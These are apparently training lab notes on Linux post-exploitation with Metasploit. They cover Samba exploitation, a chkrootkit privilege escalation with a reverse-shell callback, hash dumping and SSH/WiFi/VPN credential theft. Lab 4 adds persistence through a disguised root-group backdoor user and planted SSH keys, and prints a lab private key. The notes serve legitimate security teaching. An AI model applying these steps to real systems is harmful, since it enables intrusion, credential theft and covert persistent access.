# üî¨ Linux Post Exploitation - MSF

## Lab 1 <a href="#lab-1" id="lab-1"></a>

> üî¨ [Post Exploitation Lab I](https://www.attackdefense.com/challengedetails?cid=194)
>
> * Target IP: `192.57.42.3`
> * Metasploit **`post/linux/gather/`** modules

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.57.42.3
workspace -a Linux_PostExp
```

* Perform an `nmap` scan directly into MSF

```bash
db_nmap -sV 192.57.42.3
```

```bash
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT    STATE SERVICE     VERSION
[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: MAC Address: 02:42:C0:39:2A:03 (Unknown)
[*] Nmap: Service Info: Host: VICTIM-1
```

### Exploitation <a href="#exploitation" id="exploitation"></a>

```bash
search type:exploit name:samba
use exploit/linux/samba/is_known_pipename
options
run
```

```bash
pwd
	/tmp
```

```bash
# CTRL + Z to background the shell
sessions
```

* Upgrade the `shell cmd/unix` sessions to a `Meterpreter` session

```bash
sessions -u 1
sessions 2
```

* Some local enumeration

```bash
meterpreter > sysinfo 
    Computer     : 192.57.42.3
    OS           : Debian 8.11 (Linux 5.4.0-190-generic)
    Architecture : x64
    BuildTuple   : i486-linux-musl
    Meterpreter  : x86/linux
    
meterpreter > getuid 
    Server username: uid=0, gid=0, euid=0, egid=0
    
meterpreter > shell 
    Process 36 created.
    Channel 1 created.
```

```bash
/bin/bash -i
whoami

# Enumerate Users
cat /etc/passwd

groups root

cat /etc/*issue

cat /etc/*release

uname -a
```

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
# Network Enumeration
root@victim-1:/tmp# netstat -antp
    netstat -antp
    bash: netstat: command not found

# if not working
root@victim-1:/tmp# ss -tnl
    ss -tnl
    State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port 
    LISTEN     0      50                        *:445                      *:*     
    LISTEN     0      4096             127.0.0.11:41061                    *:*     
    LISTEN     0      50                        *:139                      *:*     
    LISTEN     0      50                       :::445                     :::*     
    LISTEN     0      50                       :::139                     :::* 

# List processes
root@victim-1:/tmp# ps aux
    ps aux
    USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
    root           1  0.0  0.0  20044  2852 ?        Ss   05:47   0:00 /bin/bash /root/start.sh
    root           8  0.0  0.0 292840 14844 ?        Ss   05:47   0:00 /usr/local/samba/sbin/smbd -D
    root           9  0.0  0.0  47076 15740 ?        S    05:47   0:00 /usr/bin/python /usr/bin/supervisord -n
    root          10  0.0  0.0 292840  6816 ?        S    05:47   0:00 /usr/local/samba/sbin/smbd -D
    root          23  0.0  0.0   4336  1552 ?        S    05:51   0:00 /bin/sh
    root          31  0.0  0.0   1152  1024 ?        S    05:52   0:00 /tmp/AOmdg
    root          36  0.0  0.0   4336   720 ?        S    05:53   0:00 /bin/sh
    root          37  0.0  0.0  20224  3316 ?        S    05:53   0:00 /bin/bash -i
    root          53  0.0  0.0  17504  2072 ?        R    05:59   0:00 ps aux

# Enumerate environment variables
root@victim-1:/tmp# env
    env
    USER=root
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
    PWD=/tmp
    LANG=C
    SHLVL=1
    HOME=/root
```

### Some Post Exploitation <a href="#some-post-exploitation" id="some-post-exploitation"></a>

* Enumerate apps and services **configuration files**

```bash
exit
# if the session dies, open a new one
sessions -u 1
```

```bash
search enum_configs
use post/linux/gather/enum_configs
info
# Description:
#   This module collects configuration files found on commonly installed 
#   applications and services, such as Apache, MySQL, Samba, Sendmail, 
#   etc. If a config file is found in its default path, the module will 
#   assume that is the file we want.
sessions
# Set the Meterpreter session
set SESSION 2
run

# It will not migrate if it's already a x64 process  
```

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
# Check the enumerated configuration files
loot
```

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate system **environment variables**

```bash
search env platform:linux
use post/multi/gather/env
info
# Description:
#   This module prints out the operating system environment variables
sessions
set SESSION 3
run
```

<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate **network information**

```bash
search enum_network
use post/linux/gather/enum_network
info
# Description:
#   This module gathers network information from the target system 
#   IPTables rules, interfaces, wireless information, open and listening 
#   ports, active network connections, DNS information and SSH 
#   information.
set SESSION 3
run
```

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
loot

#Firewall config
cat /root/.msf4/loot/20240801060629_Linux_PostExp_192.57.42.3_linux.enum.netwo_057475.txt

#DNS config
cat /root/.msf4/loot/20230422104739_Linux_PostExp_192.215.55.3_linux.enum.netwo_707609.txt
```

<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Check for **protection/security systems**

```bash
search enum_protections
use post/linux/gather/enum_protections
info
# Description:
#   This module checks whether popular system hardening mechanisms are 
#   in place, such as SMEP, SMAP, SELinux, PaX and grsecurity. It also 
#   tries to find installed applications that can be used to hinder, 
#   prevent, or detect attacks, such as tripwire, snort, and apparmor. 
#   This module is meant to identify Linux Secure Modules (LSM) in 
#   addition to various antivirus, IDS/IPS, firewalls, sandboxes and 
#   other security related software.
set SESSION 3
run
```

<figure><img src="../../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
# check above information stored within the MSFdb
notes
```

<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate the **system**

```bash
search enum_system
use post/linux/gather/enum_system
info
# Description:
#   This module gathers system information. We collect installed 
#   packages, installed services, mount information, user list, user 
#   bash history and cron jobs
set SESSION 2
run
```

<figure><img src="../../../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
loot

# Check the installed packages on the O.S.
cat /root/.msf4/loot/20230422105452_Linux_PostExp_192.215.55.3_linux.enum.syste_557868.txt
```

<figure><img src="../../../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Check if the target is a VM or a **container**

```bash
search checkcontainer
use post/linux/gather/checkcontainer
# Description:
#   This module attempts to determine whether the system is running 
#   inside of a container and if so, which one. This module supports 
#   detection of Docker, LXC, and systemd nspawn.
set SESSION 2
run
```

<figure><img src="../../../../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> üìå _A Docker container can be exploited to break out of it and gain access to the host system._

* Enumerate **VM**

```bash
search checkvm
use post/linux/gather/checkvm
set SESSION 3
run
# The target is not a VM
```

<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate **users history**

```bash
search enum_users_history
use post/linux/gather/enum_users_history
# Description:
#   This module gathers the following user-specific information: shell 
#   history, MySQL history, PostgreSQL history, MongoDB history, Vim 
#   history, lastlog, and sudoers.
set SESSION 2
run

# If this doesn't work, migrate to a "NT AUTHORITY\SYSTEM" user service
```

<figure><img src="../../../../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
loot

# Check shells
cat /root/.msf4/loot/20230422110345_Linux_PostExp_192.215.55.3_linux.enum.users_227379.txt
```

<figure><img src="../../../../../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
post/multi/manage/system_session
post/linux/manage/download_exec
```

***

## Lab 2 - Privilege Escalation <a href="#lab-2-privilege-escalation" id="lab-2-privilege-escalation"></a>

> üî¨ [Privilege Escalation - Rootkit Scanner](https://attackdefense.com/challengedetails?cid=1396)
>
> * Target IP: `192.17.170.3`
> * Exploit a vulnerable **Rootkit Scanner** and escalate privileges to root user
> * [Chkrootkit 0.49 - Local Privilege Escalation](https://www.exploit-db.com/exploits/33899)
> * SSH Credentials: `jackie`:`password`

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.17.170.3
workspace -a Linux_Privesc
```

* Perform an `nmap` scan directly into MSF

```bash
db_nmap -sV 192.17.170.3
```

```bash
[*] Nmap: Not shown: 999 closed ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: MAC Address: 02:42:C0:11:AA:03 (Unknown)
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Exploitation - SSH <a href="#exploitation-ssh" id="exploitation-ssh"></a>

```bash
search ssh_login
use auxiliary/scanner/ssh/ssh_login
options
set USERNAME jackie
set PASSWORD password
run
```

```bash
sessions
sessions 1

/bin/bash -i
    bash: cannot set terminal process group (1269): Inappropriate ioctl for device
    bash: no job control in this shell
    
jackie@victim-1:~$ pwd
    /home/jackie
    pwd
    
jackie@victim-1:~$ whoami
    whoami
    jackie
    
jackie@victim-1:~$ cat /etc/*issue
    cat /etc/*issue
    Ubuntu 18.04.3 LTS \n \l

jackie@victim-1:~$ uname -r
    uname -r
    5.4.0-152-generic
```

```bash
sessions -u 1
sessions
sessions 2

meterpreter > sysinfo
    Computer     : 192.17.170.3
    OS           : Ubuntu 18.04 (Linux 5.4.0-152-generic)
    Architecture : x64
    BuildTuple   : i486-linux-musl
    Meterpreter  : x86/linux
    
meterpreter > getuid
    Server username: no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000)
```

```bash
shell
/bin/bash -i
cat /etc/passwd
```

<figure><img src="../../../../../.gitbook/assets/image (17) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
ps aux
```

<figure><img src="../../../../../.gitbook/assets/image (19) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> üìå The `/usr/local/bin/chkrootkit/chkrootkit` binary is executed every 60 seconds.
>
> * [**`chkrootkit`**](https://www.chkrootkit.org/) - locally checks for signs of a rootkit
>
> Chkrootkit < 0.50 is vulnerable to [local privilege escalation vulnerability](https://www.exploit-db.com/exploits/33899)

```bash
cat /bin/check-down

        #!/bin/bash
        while :
        do
                /usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
                sleep 60
        done
```

* Check `chkrootkit` version

```bash
chkrootkit -V
	chkrootkit version 0.49
```

* Background both the shell and the meterpreter session with `CTRL+Z`

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

* The technique will depend on the version of the target Linux Kernel and the distribution version.
  * It is necessary to manually enumerate a privesc vulnerable program, `Chkrootkit v.0.49` in this case

```bash
search chkrootkit
use exploit/unix/local/chkrootkit
info
# Description:
#   Chkrootkit before 0.50 will run any executable file named 
#   /tmp/update as root, allowing a trivial privilege escalation. 
#   WfsDelay is set to 24h, since this is how often a chkrootkit scan is 
#   scheduled by default.
set CHKROOTKIT /bin/chkrootkit
set SESSION 2
set LHOST eth1
sessions # check the used ports
exploit
```

<figure><img src="../../../../../.gitbook/assets/image (20) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
/bin/bash -i
ls
cat flag
```

<figure><img src="../../../../../.gitbook/assets/image (21) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `9db8bf8f483ff50857f26f9bd636bed6`
{% endhint %}

***

## &#x20;Lab 3 - Dumping Hashes <a href="#lab-3-dumping-hashes" id="lab-3-dumping-hashes"></a>

> üî¨ [Post Exploitation Lab II](https://www.attackdefense.com/challengedetails?cid=195)
>
> * Target IP: `192.156.158.3`
> * Metasploit **`post/linux/gather/`** credentials dumping modules

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.156.158.3
workspace -a Linux_PostExp
db_nmap -sV 192.156.158.3
```

```bash
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT    STATE SERVICE     VERSION
[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: MAC Address: 02:42:C0:9C:9E:03 (Unknown)
[*] Nmap: Service Info: Host: VICTIM-1
```

### Exploitation <a href="#exploitation-1" id="exploitation-1"></a>

```bash
search type:exploit name:samba
use exploit/linux/samba/is_known_pipename
options
run
```

```bash
pwd
	/tmp
```

```bash
# CTRL + Z to background the shell
sessions
```

* Upgrade the `shell cmd/unix` sessions to a `Meterpreter` session

```bash
sessions -u 1
sessions 2

meterpreter > sysinfo
	Computer     : 192.156.158.3
	OS           : Debian 8.11 (Linux 5.4.0-190-generic)
	Architecture : x64
	BuildTuple   : i486-linux-musl
	Meterpreter  : x86/linux
	
meterpreter > getuid
	Server username: uid=0, gid=0, euid=0, egid=0
	# "root" user Meterpreter session
```

* Linux user account hashes can be dumped using the privileged `root` user.
* Terminate the shell session and background the meterpreter session.

### Hashdump <a href="#hashdump" id="hashdump"></a>

> üìå Linux password hashes are stored in the **`/etc/shadow`** file, accessible **only by a user with root privileges**.
>
> * In newer Linux, the hashed passwords are stored in the `/etc/shadow` file. In turn, the hashed password field in the `/etc/passwd` file is filled with the `x` character. `/etc/passwd` is readable by all the users.
> * Linux users' passphrases are hashed using the [crypt](https://manpages.debian.org/unstable/libcrypt-dev/crypt.5.en.html) function. The hashed passphrase follows a specific format: **`$id$salt$hashedpassword`**
> * [Methods Used by Linux for Hashing Passwords](https://www.baeldung.com/linux/hashing-methods-password)

* `post/linux/gather/hashdump` module need to be run manually to dump the user account hashes and unshadow them
  * A hash can be cracked (with `John the Ripper`) or stored for later use

```bash
search hashdump
use post/linux/gather/hashdump
info
# Description:
#   Post Module to dump the password hashes for all users on a Linux 
#   System
set SESSION 2
run
```

<figure><img src="../../../../../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (23) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Some Post Exploitation <a href="#some-post-exploitation-1" id="some-post-exploitation-1"></a>

```bash
post/multi/gather/ssh_creds
post/multi/gather/docker_creds
post/linux/gather/hashdump
post/linux/gather/ecryptfs_creds
post/linux/gather/enum_psk
post/linux/gather/enum_xchat
post/linux/gather/phpmyadmin_credsteal
post/linux/gather/pptpd_chap_secrets
post/linux/manage/sshkey_persistence
```

* Enumerate **ssh** directories

```bash
search ssh_creds
use post/multi/gather/ssh_creds
info
# Description:
#   This module will collect the contents of all users' .ssh directories 
#   on the targeted machine. Additionally, known_hosts and 
#   authorized_keys and any other files are also downloaded. This module 
#   is largely based on firefox_creds.rb.
sessions
# Set the Meterpreter session
set SESSION 2
run
```

<figure><img src="../../../../../.gitbook/assets/image (24) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate users' **.ecrypts directories**

```bash
search ecryptfs_creds
use post/linux/gather/ecryptfs_creds
info
# Description:
#   This module will collect the contents of all users' .ecrypts 
#   directories on the targeted machine. Collected "wrapped-passphrase" 
#   files can be cracked with John the Ripper (JtR) to recover "mount 
#   passphrases".
sessions
set SESSION 2
run
```

<figure><img src="../../../../../.gitbook/assets/image (25) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

* Enumerate **WiFi credentials**

```bash
search enum_psk
use post/linux/gather/enum_psk
info
# Description:
#   This module collects 802-11-Wireless-Security credentials such as 
#   Access-Point name and Pre-Shared-Key from your target CLIENT Linux 
#   machine using /etc/NetworkManager/system-connections/ files. The 
#   module gathers NetworkManager's plaintext "psk" information.
set SESSION 2
run
```

<figure><img src="../../../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

* Check for **PPTP VPN chap-secrets credentials**

```bash
search pptpd_chap_secrets
use post/linux/gather/pptpd_chap_secrets
info
# Description:
#   This module collects PPTP VPN information such as client, server, 
#   password, and IP from your target server's chap-secrets file.
set SESSION 2
run
```

<figure><img src="../../../../../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>

* Perform **SSH Persistence**

```bash
search sshkey
use post/linux/manage/sshkey_persistence
info
# Description:
#   This module will add an SSH key to a specified user (or all), to 
#   allow remote login via SSH at any time.
set SESSION 2
run
```

<figure><img src="../../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

***

## Lab 4 - Persistence <a href="#lab-3-persistence" id="lab-3-persistence"></a>

> üî¨ Same as [Privilege Escalation - Rootkit Scanner](https://attackdefense.com/challengedetails?cid=1396)
>
> * Target IP: `192.207.171.2`
> * Metasploit **`post/linux/gather/`** credentials dumping modules

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.207.171.3
workspace -a Linux_Persistence
db_nmap -sV 192.207.171.3
```

```bash
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: MAC Address: 02:42:C0:CF:AB:03 (Unknown)
```

### Exploitation <a href="#exploitation-2" id="exploitation-2"></a>

```bash
search ssh_login
use auxiliary/scanner/ssh/ssh_login
options
set USERNAME jackie
set PASSWORD password
run
sessions
```

<figure><img src="../../../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

* Upgrade the `shell cmd/unix` sessions to a `Meterpreter` session

```bash
sessions -u 1
```

### Privilege Escalation <a href="#privilege-escalation-1" id="privilege-escalation-1"></a>

```
search chkrootkit
use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set SESSION 2
set LHOST 192.101.97.2
run

# CTRL+Z to background the shell session
```

<figure><img src="../../../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

* Upgrade the privileged session 3 to a `Meterpreter` session

```bash
sessions 
sessions -u 3
sessions 4
```

* `SESSION 4` is a Meterpreter privileged session

<figure><img src="../../../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

### Persistence <a href="#persistence" id="persistence"></a>

* Create a backdoor user with administrative privileges that can be used to access the target system via SSH

```sh
shell
whoami
	root
cat /etc/passwd

# Create a user that looks like a service account
# and add it to "root group"
useradd -m ftp -s /bin/bash
passwd ftp
	password123
```

<figure><img src="../../../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

* Add the ftp into `root` group

```bash
# Add ftp into root group
usermod -aG root ftp

usermod -u 15 ftp

# Check current group
groups ftp
	ftp : ftp root
```

<figure><img src="../../../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

‚ùó Changing user's password is a strong indicator of compromise, it should not be done.

* Perform **SSH Persistence** with a Metasploit persistence modules

```bash
exit # CTRL+C
background
```

```bash
search platform:linux persistence
use post/linux/manage/sshkey_persistence
info
# Description:
#   This module will add an SSH key to a specified user (or all), to 
#   allow remote login via SSH at any time.
set SESSION 4
set CREATESSHFOLDER true
run
```

<figure><img src="../../../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

* Access the private key and copy the content of the `id_rsa` file and save it as a new file. Assign the appropriate permissions to the file

```bash
loot
cat /root/.msf4/loot/20240801135345_default_192.207.171.3_id_rsa_628448.txt
```

<figure><img src="../../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

```bash
vim ssh_key

# Add the private key, save and exit vim --> esc --> :wq
```

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAqR4WMpv2MlkyR7YBFErRkJBfHjzqyQh8v+8jid7KZN5uwg/0
8hIawzWMWMXRkYeWWQ64foV8KkJVEgSVuUyXzTlUYhKqGauCimQYC9FyfO/4vafH
OM6j89GOUjK1o+3CUGi7e1KqoQgxZLeHgC2z1DQv6pvt0sRtXyyvVBumQTUM7zfW
MOHMt2PvvCyWHaFqr1HF/T5QXWSI6zA6+gusRlbWqH1dC1n3htsWu7w/IVBWe7+g
pjv0knOo6HVmwM1h0KuWDSf0MqgbY0Phku4ns3A5rCQgA5DQkHlZGolyi/SC6PSY
GJCzxTetiFuXdUg6/kreP5/vOVVQZkOBIRwJowIDAQABAoIBADbNRhouSfB00QNF
6kGeIRy8e+Y7jUWJ14sGvjhuFp3rKm7+ZryOu1doocseh1OmYUUIrSZqsRqslg6Z
p779H+/j1QFW1QIufsXDu7sQqw3rYWpr1PYGmEBpNrpSLmQppp8R4TcMSbiXBBKE
Goehx7VLF//peX6kImEGBOa3cv+L33/pavLk9uqq/XDQZvnTYDY8H2GEA4WBVbiz
YmQ/1Olzo2IJDbJn5BRtwxQNJUHsHsInwrk6U3ePugAmYlsrK3CnBohQx2R/aA7C
r5k/O01sLk16Jb7zFQpO/yazkjN5nWtJ7vdT7RVts8HoKBdZQLjNMm5u4TEa4+ng
f5g4KGkCgYEA001j/MYSKf/pviMQdl/mY9VfjwEWL9hYh36mU+WUQHywBdLTcBE8
Rb/pdYSgvp18yAHhfNHPB7nhi5cPdokNnCA3B+1q/lyDP5ZgqA/yrWkZaxC+dW4G
IwJavTo88aUBbisSiRr/scsEZ+hpeTQtuuJG/PL9d6NMw1N88RBvBT8CgYEAzORF
xwS2CMYi+oYT6t4d2TriRXqRG8/uRs8SAhYXVU2CKQRI+aDuIkPm61cY4en4mooJ
3OO76NVNOo0r5vchidRAWF6Adm4LWD+Qg83OZkjBDuKoUx2y1+v5lY0dUtqJIslL
WdhqfSUwYG0vgu1F2OnuEh/QAFHXKfDD3nJLrp0CgYBWh7zIiPxrQqef+5AESeV5
QKnvUAyb70bhxdWrSbraZbVXzSxVGlnKXnrmazfAl5G//jUu/mR/z3kzxtrIOfve
0bp3fpxwKcZ9xcEzUcSZiw6jr6mvQS02LQKnty+57U6WpQDkMLBBSNg3DRAUWG/Z
tkxHzeJKmg8XdhsWRRqR1QKBgFdIDul++kS2kwQBxc5RnImDagyK7/HXG/wSDevR
mVL/V6k9aBDfG1KBdodebP0f/IVotFbitJO0+dcteDxFnoXmYxrB9xt8OVz4hwl+
zKQJ7iP3LhlqF1uf7Ixmts0qxyyIb47wgDybcQZCvPCbPxvuWzphTuwz8OKu6+GA
8viJAoGAfpgAvTJNVpdUwB0JAQVB96btt8UrtBBx26apHSJCYrUsWdLB/FhmUfv1
8VLiOGZdA5UccuCHjPUZLb49l9LmE3ufNWF3N8Anau0cDJMGTHJc0RHPB4R3ZiOz
QiAw0FMQSd1vvk7QbORPtoHaOWkW/kW7YiAQtxcJlR1EdeoZpiA=
-----END RSA PRIVATE KEY-----
```

```bash
chmod 0400 ssh_key
```

* Authenticate to the target with user `root` the private key

```bash
ssh -i ssh_key root@192.207.171.3
```

<figure><img src="../../../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

* Authenticate to the target with user `ftp` with the private key

```bash
ssh -i ssh_key ftp@192.207.171.3
```

<figure><img src="../../../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
